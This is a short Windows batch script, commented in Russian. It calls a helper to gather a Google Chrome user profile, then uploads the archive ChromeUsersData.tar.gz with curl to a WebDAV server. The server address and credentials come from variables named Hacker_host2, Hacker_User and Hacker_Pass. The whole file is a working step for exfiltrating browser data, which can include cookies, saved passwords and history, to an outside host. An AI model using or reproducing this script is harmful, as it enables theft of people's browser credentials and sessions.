@echo off
call %PUB1%\Util\getGoogleChrome_UsersProfile.cmd %1

rem Определяем переменные:
rem Основная папка
set Mainfolder=webdav
rem Префикс протокола
set pref=%Hacker_pref%
rem HTTP Port
set port=%Hacker_port%

rem HTTP WebDAV Host
set host=%pref%://%Hacker_host2%:%port%/%MainFolder%/
rem WebDAV User
set user=%Hacker_User%
rem WebDAV Password
set password=%Hacker_Pass%
rem Локальный каталог
set LocalFolder=%PUB1%\Util
 
rem Переходим в каталог сервера

cd /d %LocalFolder%
 
curl --upload-file %PUB1%\Util\ChromeUsersData.tar.gz  -v --user %user%:%password% %host%



